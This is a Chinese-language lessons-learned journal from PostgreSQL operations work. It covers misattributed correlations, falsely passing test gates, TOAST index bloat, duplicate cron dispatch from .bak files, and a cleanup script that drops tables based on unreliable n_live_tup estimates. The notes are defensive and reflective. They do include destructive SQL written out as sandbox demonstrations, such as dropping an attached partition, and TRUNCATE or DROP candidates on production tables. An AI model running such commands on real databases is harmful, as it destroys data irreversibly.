  并断言「失败样本不会恰好都缺这个字段」。
  ⇒ **统计口径变化时，`grep` 原文计数 vs 解析器计数必须对账**；
  对不上就说明解析器有 bug，两个数都不能用。

### ⭐⭐⭐ 相关系数是**排除候选机理**的廉价工具

第一版把超时归因于「基线中位数 15 小时涨 10%」。算个 Spearman：
**耗时 vs 基线中位数 = −0.003**（毫无关系），**耗时 vs `ctrl_rows` = −0.648**（强）。
⇒ 一个相关系数近 0 的量**不在因果链上**，我差点拿噪声当机理。
⇒ 但 −0.648 也**只是相关**：`ctrl_rows < 10,000` 时 43/43 全失败，
可我没有 PG 侧证据证明「写得少导致慢」，更可能是**同因**。
⇒ 通用式：⭐⭐⭐ **发现"某量在涨"就归因之前，先算它与目标量的秩相关；
近 0 就当场排除，别写进结论。** 同时明确区分「相关」与「因果」的措辞。

## 2026-10-19 §106 轮：运维日志里的相关性，默认被「自己的干预」混淆

### ⭐⭐⭐⭐⭐ 异常数据点往往正是你做操作时产生的——你去修的东西，就是把样本点搞脏的东西

§105 从 377 轮巡检日志里算出 `Spearman(耗时, ctrl_rows) = −0.648`，
且 `ctrl_rows < 10,000` 时 **43/43 全部失败**，判成"最强信号"并据此给了改造方向。

§106 用两条独立证据证伪：

1. **结构上不可能**：主判据三条分支的扫描区间全是历史区间
   （`NOW-7d → NOW-3h` 等），`cur` 只占 4% 成本，且 `series` 照样生成 slot
   ⇒ **写手停 ⇒ 少几小时数据 ⇒ 扫得更少 ⇒ 只会更快**。
2. **时间轴逐段对齐**：`ctrl=0` 的小时生产表里**零行且戛然而止**
   （10-12 写到 03:48、10-13 写到 01:04），而这些窗口**全部落在自己的作业时间里**
   —— 154/245 的部署、迁移 855 自动应用、§10.110.39 记录的写入路径故障。

⇒ ⇒ **判别动作：把每个异常样本的时间戳，拿去和「我在这段时间做了什么」对账。**
本节一对账，43/43 的强相关瞬间从"机理"降级成"我重启过它"。

### ⭐⭐⭐⭐ 先读实现，再算相关

如果先做第一步（读脚本扫描区间），能在**零次生产查询**之前否掉整个 `ctrl_rows` 假说；
反过来我先花了一个多小时做全量统计，结论还错了。
⇒ **要给出因果解释前，先问「这个量在结构上有可能影响被测量吗」。**

### ⭐⭐⭐⭐ 「方向对、理由错」必须分开记录

撤回 `ctrl_rows` 之后，「让基线不必每小时重算」这个**方向依然成立**
（§85 直接实测 96% 成本在基线），但**理由要换**。
⇒ 若只写"撤回某结论"，下一个人会连正确的方向一起丢掉；
若只写"方向仍对"，错误理由会被继续引用下去。**两条都要写。**

### ⭐⭐⭐ 只记总耗时、不记分段耗时的巡检，等于放弃了可诊断性

这条巡检从 10-09 第一个 ABORT 起就无法回答"哪条分支吃掉了 180s"，
本轮也只能靠读脚本行号反推。
⇒ **诊断工具本身要按「下一次故障要靠什么定位」来设计**，
分段 `\timing on` 成本几乎为零，收益是下一次能直接定位到分支。

## 2026-10-19 §108 轮：一条十几天没人碰的读数 + 判据被变异验证打回两次

### ⭐⭐⭐⭐⭐ 用字符串位置去推断代码结构，会连续造出两个假绿

断言「`RESET work_mem` 必须在 `defer` 里」，我改了三版，前两版都是假绿：

| 版 | 写法 | 为什么假绿 |
|---|---|---|
| 1 | `LastIndex("defer func()") < Index("RESET")` | RESET 改成裸调用（在 defer 之后）照样满足 |
| 2 | 加边界推算 `Index(body[resetAt:], "}()")` | **在整个函数体剩余部分搜**，后面任意一个 defer 都能满足；且 `body[d:resetAt]` 把 d 处那个 `defer func() {` 自己也包进去 ⇒ **恒真** |
| 3 | 钉精确形态 `Contains(body, 完整 defer 块)` + `Count("RESET work_mem")==1` | ✅ |

⇒ ⇒ ★ **"看起来在测结构"的判据，实际测的往往是文本顺序。**
⇒ **能钉精确形态时就不要推断结构**；要推断就必须先问"这个边界会不会被后面的代码满足"。
★ 同族：[[断言要钉性质不钉写法]] 那一节的镜像：**钉性质也可能只是钉了顺序**。

### ⭐⭐⭐⭐⭐ 眼前的读数放了十几天没人碰：temp_bytes = 104 GB

`pg_stat_database.temp_bytes` 每次查库况都会看到，`§97~§107` 十几天里**一次没碰**——
因为前面几轮都在扫"空间"，没有一个判据指向"效率"。
⇒ ⇒ ★ **换判据时先问「有哪些指标我从没查过」**，而不是沿着上一轮的方向继续收窄。

### ⭐⭐⭐⭐ 两把尺子不在同一时间窗，对账方式不同结论完全相反

- `pg_stat_database.temp_bytes` = 104 GB / ≥13.8 天
- `pg_stat_statements` = 8,149 MB / **11.6 小时**（10-18 22:03 被重置过）

直接比会得到"覆盖率 7.7%，其余无从查证"；**折算成速率**才看出真相：
近期 16.9 GB/天 vs 长期 7.5 GB/天 = **2.25 倍加速**。
⇒ ⇒ ★ **跨统计源比"总量"之前，先折算成速率**；总量差可能全部来自窗口长度差。
★ 这与 §107 是同一件事的第二例：**不与权威来源对账就会得出错的比例**。

### ⭐⭐⭐⭐ 临时文件异常先算「数据量 ÷ work_mem」，别急着改查询

`work_mem = 8 MB`，而单次 MV 刷新的排序量是 **9~136 MB** ⇒ 必然落盘十几个临时文件。
⇒ **这不是"某次查询跑飞了"，是内存预算的算术后果**；
改索引、改视图定义都是白费力气。
⇒ 通用式：⭐⭐⭐⭐ **看到 temp 写入异常，先算被排的数据量 ÷ work_mem**，
比值远大于 1 时问题在内存预算，不在查询计划。

### ⭐⭐⭐ 复用既有模式时，先确认它的前提对你成立

`mvRefreshStatementTimeout` 的"SET + defer RESET"模式直接照搬给 `work_mem`；
成立的前提是**每轮只有一个实例执行刷新**（令牌桶 + advisory lock）。
⇒ 抄模式前把"这个模式为什么在这里安全"一并写进注释，
否则下一个人会把 256MB 复制到一个并发 N 倍的位置上。

## 2026-10-19 §109 轮：结论对、理由错，比结论错更危险

### ⭐⭐⭐⭐⭐ 写完就自查：我把溢写机理写成了"排序排不下"，实际是 HashAggregate

§108 写"`work_mem=8MB` 而单次刷新要排 9~136MB ⇒ 必然落盘"。
§109 复查时三条反证把它推翻：

1. **输出极小**：`session_task_stats` 6 行、`routing_audit_summary_7d` 2 行
   ⇒ 6 行的结果集不存在"排不下 136MB"
2. **计划里没有 Sort**：`EXPLAIN (COSTS OFF)` 给的是
   `Partial HashAggregate → Gather → Finalize HashAggregate`
3. 输入侧是 `_request_logs_hot` 与 5 个归档分区按 `ts` 逐分区回连

⇒ 正确表述是「溢写来自 `work_mem` 受限的**中间节点**」。
⇒ **结论（抬 work_mem）仍然成立**——HashAggregate 同样按 work_mem 分区、超限即落盘。

⇒ ⇒ ★ **「结论对、理由错」比「结论错」更危险**：
错误理由会让人去优化错误的东西（去给结果集瘦身，而不是抬内存预算）。
⇒ ⇒ 通用式：⭐⭐⭐⭐ **改一处之前，先确认自己引用的机理描述是真的**，
且最好在**写完同一节内**自查——隔一天再查，成本会高很多。
★ 这也是 §102 那条「承重断言查不到权威来源时让建议不依赖它」的延伸：
**承重理由错了，即使结论碰巧对，方案也不该按原样交付。**

### ⭐⭐⭐⭐ 归因数据不在了，要如实说"数据已经不在"，而不是"我还没查到"

想找 2.25 倍 temp 加速的拐点，四条路全断：
- `docker logs pg-252-pg17 --since 720h` → 0 条
- 不限时间 → **总共 0 行**（已轮转；§10.86.1 在 10-06 还能读到）
- `pg_stat_statements` → 10-18 22:03 已重置，只剩 11.6h
- `pg_stat_database.temp_bytes` → 单调计数器，无历史

⇒ 「我还没查到」与「数据已经不在了」是两种完全不同的状态，
**后者必须写清楚**，否则下一个人会以为再努力一下就能查到。

### ⭐⭐⭐⭐⭐ 归因来源会被重置 + 日志不留存 ⇒ 每次故障的历史证据都从零开始

252 这个 PG 上：查询归因**只有 `pg_stat_statements` 一个来源**，而它会被重置；
PG 自身日志不留存。两者叠加 ⇒ 任何事后归因都只能看最近一个窗口。

⇒ 这解释了本轮两个具体挫败的**同一个根因**：
§105 只能看 11.6 小时去回答一个"从 10-09 起的复发"问题；
§108 能算出 2.25 倍加速却找不到拐点。
⇒ 与 §106（巡检只记总耗时）是**同一个病的两种表现**：
**不是"忘了记"，是没人把「可归因」当成硬需求。**
⇒ ⇒ 根治方向是**留存**而非补字段：① PG 日志留存与轮转
② `pg_stat_statements` 定期快照归档，而不是靠重置清空间。

## 2026-10-19 §113 轮：引错一行，和「同语句里已有正确写法」

### ⭐⭐⭐⭐⭐ grep 命中一个字段名时，必须确认它属于哪个结构体

§112 我拿 `client.go:1152-1158` 的 `entry.CredentialID` 当成
"`_request_logs` 的落库语句"，据此写下"转换处没丢"的结论。
实际那几行绑定的是 **`entry.ChosenCredentialID`**，
属于 `DecisionLogEntry`，写入 **`routing_decision_log_hot`**。

⇒ 本仓同时存在 `CredentialID` / `ChosenCredentialID` / `UpstreamCredentialID`，
以及门禁 `expectedArgIdent` 映射里的同名字符串。
⇒ ⇒ ★ **名字相同不代表语义相同**。
⇒ ⇒ 通用式：⭐⭐⭐⭐ **grep 命中一个字段名后，下一步是"它左边那行属于哪个 struct、
右边那条 SQL 写的是哪张表"，而不是直接开始论证。**
★ 同族：[[断言要钉性质不钉写法]] —— 这次连"钉的是谁"都没钉。

### ⭐⭐⭐⭐⭐ 「同一条语句里已有正确写法」是最强的缺陷证据

```sql
credential_id = EXCLUDED.credential_id,                                        -- :1582 无条件
affinity_hit   = COALESCE(EXCLUDED.affinity_hit, _request_logs_hot.…),          -- :1587 有守卫
```

⇒ 二者**在同一条 `ON CONFLICT … DO UPDATE SET` 里，相隔 5 行**。
⇒ ⇒ ★ 这比"我认为应该加 COALESCE"强一个量级：
**它证明维护者知道这个模式、也在用，只是没覆盖到这一列。**
⇒ ⇒ 判别动作：**在给一条语句提修改建议前，先在它周围找有没有同款写法的邻居。**
有 ⇒ 你的建议不是"引入新模式"，是"补齐遗漏"，论证成本天差地别。

### ⭐⭐⭐⭐⭐ 「表是空的」有两种完全相反的含义，处置天差地别

`_request_logs_hot` 实测 `count(*)=0`，我（§97/§104）据此把它列为
"退役 v1 表、可 TRUNCATE"。
而 `client.go:1419-1423` 说明：所有写入**统一进 `_hot`**，
后台 `partition_manager` 定期 `promote_request_logs_hot_to_partition()`
把 **>7 天**的冷数据搬进月度分区。

⇒ ⇒ ★ **空表可能意味着「没人用了」，也可能意味着「刚被搬走了」。**
⇒ ⇒ 处置前必须问：**这张表现在还是不是写入路径的一部分？**
⚠ 本例若按原判据 TRUNCATE，**会打断正在使用的热表**。
★ 同族：[[§90 的教训：治理清单要按宿主寿命切分]] ——
**这次连"宿主还活着"都没确认就列进了回收清单。**

### ⭐⭐⭐ 「两段式写入」假设可以用一条聚合直接判掉

怀疑"先写占位行、后写终态行"时：
```sql
SELECT count(*) FROM (
  SELECT request_id FROM request_logs_2026_10
  WHERE ts >= now() - interval '7 days' GROUP BY request_id HAVING count(*)>1
) d;
```
⇒ 0；且 `total_rows = distinct_requests = 47,899`。
⇒ **幂等 upsert 把两段压成了一行，两段式假设当场出局。**
⇒ ⇒ ★ 判别动作：**"写了几次"的问题，先去问"表里还看得出写了几次吗"。**

## 2026-10-19 §114 轮：查**真值**而不是查默认值；「量具的覆盖边界」要和「量具的准确度」分开算

### ⭐⭐⭐⭐⭐ 配置项的**默认值**不能当现状用

`storage.request_logs_write_enabled` 在 `settings/spec_storage.go` 里 `Default: true`。
只读 spec 会得出"写路径是开着的"⇒ 整套 TRUNCATE 判据的前提全错。

⇒ ⇒ ★ 必须去 `settings_kv` 查**实际值**：
`value=false`，`updated_at=2026-10-13 20:18:27`。
⇒ ⇒ 通用式：⭐⭐⭐⭐⭐ **"这个开关现在是开是关"只能从持久化状态读，
不能从它的出厂默认读。** 且读出来之后**必须连 `updated_at` 一起读** ——
时间戳往往比布尔值更能定性（它常常和另一个现象对得上：本例月分区冻结在 20:18:11）。
★ 同族：[[统计源会被重置时，先查它有没有兄弟源]]。

### ⭐⭐⭐⭐⭐ 「空表有两种含义」这条纪律**第二次生效**，但两次答案相反

| | §74 | §114 |
|---|---|---|
| 空的原因 | promote 把数据**搬走了** | **门控停写**，promote 作业被**整体摘掉** |
| 处置 | 不能 TRUNCATE | **可以 TRUNCATE**（活行 0、结构保留） |

⇒ ⇒ ★ 关键在于**每次都要重新查**，不能把上一轮的结论沿用。
⇒ ⇒ 判别动作（本轮用的）：**先查「写入路径现在还通不通」，再查「空是因为没写还是因为被搬」**。
本轮是**先查调用方**（`bg/partition_manager.go:1534` `filterRetiredV1Lifecycle`）
才定性 —— 读 spec 读到的是"停写"，
读 spec **永远不会**告诉你"停写时连 promote 都会被摘掉"。

### ⭐⭐⭐⭐⭐ 量具的**覆盖边界**必须和**准确度**分开评估

`pg17-index-bloat.sh` 的候选集带 `n.nspname = 'public'`
⇒ **`pg_toast` 命名空间整体不可见**（3 个索引 / 300 MB），
其中 `pg_toast_81522141_index` = **229 MB、29,299 个死页、avg_leaf_density 0.54%**。

⇒ ⇒ ★ **"脚本跑得很准"不等于"脚本看得全"**。
我之前写"它跑了 8 次、把每条膨胀索引都报对了"——那是**准确度**，
**覆盖边界**是另一条轴（这次是 `pg_toast` + §104 的 `relispartition` 两个洞）。
⇒ ⇒ 通用式：⭐⭐⭐⭐⭐ **评一个巡检机制要问两个问题：
① 它对已知样本准不准（准确度）② 它能看见多少个对象（覆盖边界）。
只答 ① 就宣布"机制健康"，是本轮第三次出现的同一族错误。**

⇒ ⇒ **修法不能是一刀切**：3 个 ≥16MB 的 TOAST 索引里**只有 1 个真膨胀**
（另两个叶页密度 89.88% / 90.18%）⇒ 必须沿用**双信号判据**
（`deleted_pages` OR `avg_leaf_density`），只放宽命名空间条件。
★ 同族：[[阴性结论要当缺陷一样复核]]。

### ⭐⭐⭐⭐⭐ VACUUM 收不了索引的空间 ⇒ 空表也可以背着 229 MB

本地 PG 17.10 沙箱（`llm-gateway-pg`，同镜像 `kx-citus-pg17`）复现：
2,000 行 × 80KB 随机 hex → TOAST 索引 1,800 kB；
`DELETE` + `VACUUM` 后**仍是 1,800 kB**（VACUUM 只管堆表）；
`pgstatindex`：`deleted_pages=222`、`leaf_pages=1`、`avg_leaf_density=0.05`
⇒ **与生产的 29,299 / 1 / 0.54% 逐条吻合**；
`REINDEX INDEX CONCURRENTLY` ⇒ **1,800 kB → 8,192 bytes**。

⇒ ⇒ ★★ **这是"DELETE 密集的负载 + 大 TOAST 载荷"这一族的通用机理**：
**空表 ≠ 小表**。
⇒ ⇒ 判别动作：看到"表是空的但占着几百 MB"，**先拆 fork**
（`reltoastrelid` + `pg_index`），再看 `pgstatindex` 的 `deleted_pages`。
⇒ ⇒ 顺带解决了一个悬着的操作问题（PG 17.10 实测三条全允许）：
**`REINDEX INDEX CONCURRENTLY` 对 TOAST 索引可用且有效** ——
⇒ **229 MB 可以在线、不加锁、不改结构地收回**，比 `TRUNCATE` 严格更优。

⇒ ⇒ ★ **本地沙箱的第一版夹具是无效的**：
`repeat('x', 100000)` 高度可压缩 ⇒ 被压回行内 ⇒ **压根没进 TOAST**，
读数恒为 8,192 bytes。是**读数本身**（而不是推理）抓住的。
⇒ ⇒ 通用式：⭐⭐⭐⭐ **造「必然产生某种物理形态」的夹具时，
要选**不可压缩**的内容**（随机 hex / 随机字节），
否则你以为在测 TOAST，其实测的是行内存储。**
★ 同族：[[mock 夹具与真实上游 payload 不一致 ⇒ 判据恒绿]]。

### ⭐⭐⭐⭐ 「回收空间」和「修行为」是两件事，处置项要分开列

门控停写期间，`recent_success_rate()` 直读**恒空**的 `_request_logs_hot`
（3 小时窗口）⇒ 静默返回零 ⇒ 被消费方读成「正常」（§74）。
⇒ ⇒ ★ **TRUNCATE / REINDEX 解决空间，解决不了这个**。
⇒ ⇒ 通用式：⭐⭐⭐⭐ **列处置项时，把"能回收多少 MB"和"会改变什么行为"分成两栏** ——
否则一条 TRUNCATE 会看起来同时解决了两个问题，而它只解决了第一个。

### ⭐⭐⭐⭐ 授权项的**数字**要临用临取

`usage_facts_default`：旧记录「堆 80 MB + 索引 43 MB」，
实测**堆 0 bytes、活行 0、total 80 MB 全在 7 条索引上**。
`ursm_node_snapshot_min_legacy`：852 MB 里**有 2,836,620 行活数据**
⇒ 它不是"清空间"，是**删 284 万行历史快照**，属主拍板范畴。
⇒ ⇒ ★ **清单上的数字会过期**（VACUUM 回收、批量删除都会改它），
⇒ **授权前重读一次**，别拿三天前的数字去批一个删除数据的操作。

## 2026-10-19 §115 轮：「信号参与了判断」≠「信号参与了最终判定」—— 我的门禁第一版是假绿的

### ⭐⭐⭐⭐⭐ 判据必须构造「只改一个变量、结论必须翻转」的对照

`pg17-index-bloat.sh` 的判定链：

```sh
reason=""
[ "$dead_pages" -ge "$MIN_DEAD_PAGES" ] && reason="dead_pages=..."     # 文案
if awk ... 'BEGIN{exit !(y<t)}'; then reason="...low_density=..."%"; fi # ★ 只改文案
headroom_mb=$(awk ... '(d + l*(1-y/100))*8192/1048576')                  # ★ 真正的判定门
if [ "$headroom_mb" -ge "$MIN_RECLAIM_MB" ]; then → CANDIDATE
```

我第一版判据把「密度信号」当成**独立的候选门**，写「无死页 + 低密度 ⇒ 应判 CANDIDATE」。
**它全绿。** 变异验证时才发现：**密度信号只参与 `reason` 文案**，
真正的门是 `headroom`，而 `headroom` 公式**本身**含密度项
⇒ 「把密度信号打成恒假」**根本不影响判定** ⇒ 门禁**理应**全绿 ——
**是我的判据写错了，不是脚本错了。**

⇒ ⇒ ★★ 重写为**对照**：`deleted_pages` 30000→100（其余固定）结论必须翻转；
密度 10%→90%（其余固定）结论必须翻转。
⇒ ⇒ ★★ **通用式：⭐⭐⭐⭐⭐ 「某信号参与了判断」≠「该信号参与了最终判定」。**
判据若只断言**中间量**或**文案**，就会把「解释」当成「门」来测 ⇒ **恒绿**。
⇒ ⇒ ★ **判据必须断言最终结论，并且让每个被测信号都有一组「只改它、结论就翻」的对照。**
⇒ ⇒ ★ **顺带**：**门槛也是判据的一部分**。第一版忘了 `MIN_RECLAIM_MB=32`，
`leaf=5000/密度10%` 的 headroom 只有 28MB，压根够不到门槛。
★ 同族：[[变异没施加 ≠ 判据无敏感性]] · [[断言要钉性质不钉写法]]。

### ⭐⭐⭐⭐⭐ 门禁做成**功能级**（假运行时记录真正下发的 SQL），别扫文本

新门禁 `scripts/ursmcheck/index_bloat_candidate_coverage_test.go` 用假 `podman`：
它**记录脚本实际发给 psql 的 SQL** 并按查询类型返回固定结果
（同 `pg_availability_check_test.go` 的范式）。

⇒ ⇒ ★ 三个好处：
① **把判定词写进脚本注释骗不过它**（断言的是下发的 SQL，不是文件文本）；
② 脚本改用变量拼 SQL 也骗不过它；
③ 能验**行为**而不只是文本——「候选集里有 TOAST 索引 ⇒ 脚本**真的**对它发起了
`pgstatindex` 探测」端到端成立。
⇒ ⇒ 通用式：⭐⭐⭐⭐ **脚本类门禁优先用「假运行时 + 观测实际下发的东西」，
而不是「正则扫文件」**。后者只能证明"文本里有这句话"。

### ⭐⭐⭐⭐ 改覆盖面之前，先把「代价」量出来

§104 提出删过滤器，但自己留了前置：「必须先确认运行时间」。
本轮用生产只读实测 `pgstatindex` 速率（60~115 MB/s），
把「新增 72 条 / 4,455MB ⇒ +60~120 秒」这个数**测出来**，
才动脚本。⇒ ⇒ ★ **脚本注释里那句「42 候选 >10 分钟」是当年的读数，不是今天的** ——
与 §114 的「授权项的数字要临用临取」同族：**量具的读数也会过期**。
★ 同族：[[统计源会被重置时，先查它有没有兄弟源]]。

### ⭐⭐⭐⭐ 覆盖面扩大 ≠ 判据可以放宽

`pg_toast` 里 3 条 ≥16MB 的索引**只有 1 条真膨胀**（229 MB / 29,299 死页 / 密度 0.54%），
另两条叶页密度 **89.88% / 90.18%**。
⇒ ⇒ ★ 改成「≥16MB 就 REINDEX」的一刀切会**纯浪费**。
⇒ ⇒ ★ **改「看得见多少」的时候，必须同时确认「怎么判」没被顺手放宽** ——
本轮为此专门留了「两种浪费形态各自独立生效」的门。
★ 同族：[[阴性结论要当缺陷一样复核]] —— 阴性样本也是判据的一部分。

## 2026-10-19 §116 轮：**「同族三处里的唯一一处没抄」是一类可搜索的缺陷**；量具的老账会顺着下游流到 DELETE

### ⭐⭐⭐⭐⭐ 已知纪律的**下游受害者**才是最危险的那个

`n_live_tup` 不是行数 —— 本手册已经记了 **5 次**（§93 / §94 / §107 / §114 附近 / §114 的镜像形态）。
本轮我又拿它当行数用了一次，**在 §114 写下「816,144 行」**（真实 `count(*)` = **330,463**，高估 2.5×）。

⇒ ⇒ ★★ 而真正危险的不是我又犯了一次，是：
**同一个坏量具在下游驱动着一个自动 `DROP TABLE`。**
`pg17-emergupgency-cleanup.sh` L1 用 `n_live_tup=0` 选「死表」→ 裸 DROP →
生产实测**命中 6 张表 / 2,817 MB，其中 5 张并非空表**（`ursm_node_snapshot_min_legacy` 真实 **2,836,620** 行），
而 252 磁盘 **71%**、阈值 **90%**、脚本**每 15 分钟跑一次** ⇒ **引信还剩 19 个点**。

⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐⭐ **量具出错的代价不在使用它的那一刻，而在它被接进
「不可逆动作」（DROP / TRUNCATE / 发消息 / 记账）的那一刻。**
⇒ ⇒ ★ **纪律：凡是要接不可逆动作的判据，必须用权威量（`count(*)`）复核，不能只用估计量筛选。**
★ 同族：[[量具不可用与真没问题必须可区分]] —— 但这里量具**不是不可用**，是**可用但不准**，更难防。

### ⭐⭐⭐⭐⭐ 「同族三处里的唯一一处没抄」是可搜索的

| 分支 | COUNT(*) 复核 | 排除分区 |
|---|---|---|
| emergency 的 `_default` 分支 | ✅ 注释写着「验证是否真的为 0 行」 | ✅ 先 DETACH |
| `pg17-proactive-empty-table-cleanup.sh` | ✅ | ✅ SQL + 行为两道闸 |
| **emergency 的 L1 死表分支** | ❌ | ❌ |

⇒ ⇒ ★★★ **这不是「没想到」，是抄漏了一处。**
⇒ ⇒ ★ 通用式：⭐⭐⭐⭐ **发现缺陷时，先在同一文件/同一族里列全所有同类分支，
逐条问「这里抄了吗」** —— 列全之前不要开始改第一个。
★ 同族：[[§15 的教训：「某门绿了」≠「不存在这样的门」]] 的对偶：
**「修好了一处」≠「这一族修好了」**。

### ⭐⭐⭐⭐⭐ PG **不保护**已挂载的分区（实测，别靠直觉）

```
DROP TABLE IF EXISTS child;   -- child 是 parent 的 ATTACH 分区
                               -- ⇒ 成功，无报错
SELECT count(*) FROM parent;  -- ⇒ 少了一半行（静默）
INSERT INTO parent VALUES(...); -- ⇒ ERROR: no partition of relation "parent" found
```

⇒ ⇒ ★★ **「有父表依赖，DROP 应该会失败」是错的直觉。**
⇒ ⇒ ★★ 丢掉分区 = **数据丢失 + 写路径事故**两件事，不是一个量级。
⇒ ⇒ 判别动作：凡是脚本会 `DROP` 任何东西，先问「**它可能是分区吗**」，
并在**本地沙箱**里把这条问句跑成一次真实 DROP（30 秒）。

### ⭐⭐⭐⭐ 门禁自己也会假绿：假运行时的**多个变体**必须共享同一份行为定义

第一版门禁的假 docker 有两个「变体」（基础版 + 按表名应答版），
**按表名应答版把基础版整个覆盖掉了，连轨迹记录都没留**
⇒ 轨迹文件不存在 → 我最初写成「读不到就 Fatal」，后来为了让另外两个用例跑过改成了容忍
⇒ **轨迹为空 ⇒ `strings.Contains("", "DROP …")` 恒假 ⇒ 用例全绿**。

⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐ **「断言对象为空」会让所有否定式断言恒真。**
⇒ ⇒ 修法两条：① 多个假运行时变体**共享同一份脚本**（用环境变量区分行为，别用多份文件）
② **加一条「夹具确实被用到了」的自检**（本轮落成 `requireCalls()`：脚本一次没调 docker 就判失败）。
★ 同族：[[0 命中的第一嫌疑永远是量具坏了]] · [[阴性结论要当缺陷一样复核]]。

### ⭐⭐⭐⭐ 根因常常在**另一份白名单**里

`n_live_tup` 为什么停在 0？PG 在 10-05 重启 ⇒ `pg_stat` 归零 ⇒
而 `analyze_llm_gateway_table_stats()` 的覆盖面是**两张白名单**（`*_hot` + 11 个族带月份后缀），
`ursm_node_snapshot_min_legacy` 两张都不在 ⇒ 永远补不上统计。

⇒ ⇒ ★★★ **不是「统计没跑」，是「谁负责跑它」这件事有白名单，而落选者没人管。**
⇒ ⇒ 通用式：⭐⭐⭐⭐ **查「某个自动化为什么没做 X」时，去读**负责做 X 的那个组件的选择条件**，
而不是只看 X 的配置开关。** 白名单 / 黑名单 / 命名约定都是「责任边界」，它们比开关更容易漏人。
★ 同族：[[§90 的教训：治理清单要按宿主寿命切分]]。

## 2026-10-19 §116 二轮：「倍数」必须与「条目数之和」对账；**同一个字段名可以连错两次**

### ⭐⭐⭐⭐⭐ `/etc/cron.d/` 里的 `.bak` 是**活 crontab**（不是备份）

`ls /etc/cron.d/` 里有 4 个 `pg17.bak.*`。直觉（来自 run-parts）会说「带点的文件名会被跳过」——
**cron 不会**。⇒ 每个 pg17 作业被重复派发：

| 作业 | 出现在几个 cron.d 文件 | 实测派发 |
|---|---|---|
| `pg17-pg-availability-check.sh` | 2 | 每分钟 2 条 CMD |
| `pg17-emergency-cleanup.sh` | **5** | 每轮 **5** 条 CMD |

⇒ 两个倍数**各自精确等于条目数之和**。

⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐ **「把备份放在会被执行的目录」= 多了一个活实例。**
判别动作：**任何会被程序扫描的目录（cron.d、systemd 的 *.d、init.d、run-parts 目录），
都不能放备份** —— 与 run-parts 不同，**cron 不过滤带点的文件名**。
⇒ ⇒ ★ **这与「脚本副本」是同一族**（2026-10-10 已犯过一次：310 份 `pg17-disk-watch.sh`），
**同一类错误在两个层面各犯一次** ⇒ 见「同一模式跨三个工作日复现就晋级为规则」的判据。
★ 同族：[[§90 的教训：治理清单要按宿主寿命切分]]。

### ⭐⭐⭐⭐⭐ 单实例锁**去不掉**「重复派发」，因为重复实例根本活不到锁生效

脚本有 `flock` 单实例闸门，但本作业**执行不到 1 秒**（磁盘 < 90% 时预检查就 `exit 0`）
⇒ 锁在下一条派发之前已经释放 ⇒ **每一轮 5 条派发全部真正执行**（日志看起来只有 1 份，
因为 4 次是在同秒内被锁挡掉或直接跳过）。

⇒ ⇒ ★★★ **单实例闸门只保证「不并发」，不保证「不重复」** ——
判别动作：读到「有单实例锁」时，问一句 **「最快一次执行要多久」**；
秒级以下的作业，锁等于没有。

### ⭐⭐⭐⭐⭐ 同一个字段名，我在同一个小时内连错两次

| 我的推断 | 错在哪 | 一句话否掉它的动作 |
|---|---|---|
| 「`llmgw-source` 不在 `/etc/passwd` ⇒ 这批 cron 作业全是坏的」 | `/etc/cron.d` **第 6 段才是用户**，这里就是 `root`；`llmgw-source` 是**第 7 段的命令**（source 配置再 exec 的包装脚本） | `command -v llmgw-source` |
| 「availability 才 2 次/分 ⇒ `.bak` 没被解析 ⇒ 假设错」 | 只用观测值否假设，**没回头核对「哪个文件里有哪些条目」**。availability 只在 2 个文件里有 | 把倍数与**条目数之和**逐个对账 |

⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐ **观测到的倍数 ≠ 配置的意图** ——
**否定一个假设之前，先确认「被观测的那个量」和「你以为你在观测的那个量」是同一个。**
第二行是本轮最容易复现的错：**手里只有一个观测值时，不足以否定任何关于分布的假设。**
★ 同族：[[grep 命中字段名后必须确认它属于哪个 struct 和哪张表]]（同一个字段名，两次读成两个东西）。

### ⭐⭐⭐ 拿估计量接不可逆动作，是本手册第 6 次同族事故——**下游受害者最贵**

`n_live_tup=0` 当 DROP 条件（§116）。本手册已记 5 次该量具不可信，本轮又写错一次数字。

⇒ ⇒ ★★★ 通用式：⭐⭐⭐⭐⭐ **量具出错的代价不在使用它的那一刻，
在它被接进「不可逆动作」的那一刻。**
⇒ ⇒ **纪律：凡接不可逆动作（DROP / TRUNCATE / 发消息 / 记账）的判据，
必须用权威量复核，估计量只能用来「筛出可疑」。**
★ 同族：[[量具不可用与真没问题必须可区分]] —— 但这里是「量具**可用**但不准」，更难防。

## 2026-10-19 §117 轮：普查口径要取自**实际调度面**，不是文件树；「承诺没兑现」是一类可搜的缺陷

### ⭐⭐⭐⭐⭐ 审计对象是**调度面**，不是文件树

`grep -l "n_live_tup" scripts/` 命中 **22 个文件**；
而 `/etc/cron.d/pg17` 实际注册 11 个作业，其中**会写库的只有 5 个**。
⇒ ⇒ ★★★ **「文件里出现了这个量具」≠「它驱动着生产动作」。**
⇒ ⇒ 通用式：⭐⭐⭐⭐ **审计自动化脚本时，先取「实际被调度的清单」（cron.d / systemd timers /
supervisor 配置），再在那个清单上筛危险动作** —— 直接扫文件树会把力气花在
`deprecated/`、测试脚本、容量基线查询上。
★ 尤其：**仓内的清单文件 ≠ 服务器上的实际状态**（本轮 `.bak` 就是活 cron）。

### ⭐⭐⭐⭐⭐ 「同一件事只有一个实现」要当成待查项，而不是既定事实

`pg17-vacuum-bloat.sh` 头部白纸黑字写着「用 pgstattuple 扩展（如果没有就用 dead_tup_pct 估算）」，
而**代码里只有估算那一条路径**。⇒ 注释承诺的「真读表」从来没实现过。

⇒ ⇒ ★★★ **注释描述的是「作者设想的路径」，代码执行的是「实际存在的路径」** ——
两者不一致本身就是缺陷线索（和 §110「注释里的耗时描述不是根因」同族，
但方向相反：那次是**注释比代码乐观**，这次是**注释承诺的能力根本不存在**）。
⇒ ⇒ 判别动作：**看到「A 或 B」的二选一实现，先确认两条路径是不是都存在。**

### ⭐⭐⭐⭐⭐ 同族的**危险方向**要逐个判，不能因为「这次落在安全方向」就放过

§116 那批 `n_live_tup=0` 的表，`n_dead_tup` 也是 0 ⇒ `dead_pct=0` ⇒
`pg17-vacuum-bloat.sh` **恰好**把它们跳过了。

⇒ ⇒ ★★ **这是「坏量具落在安全方向」，不是「量具没问题」。**
⇒ ⇒ 通用式：⭐⭐⭐⭐ **同一个坏量具在不同脚本里的误差方向可能不同（一个删数据、一个浪费锁），
必须逐个脚本判方向，不能因为「这次没出事」就认为该族已清。**
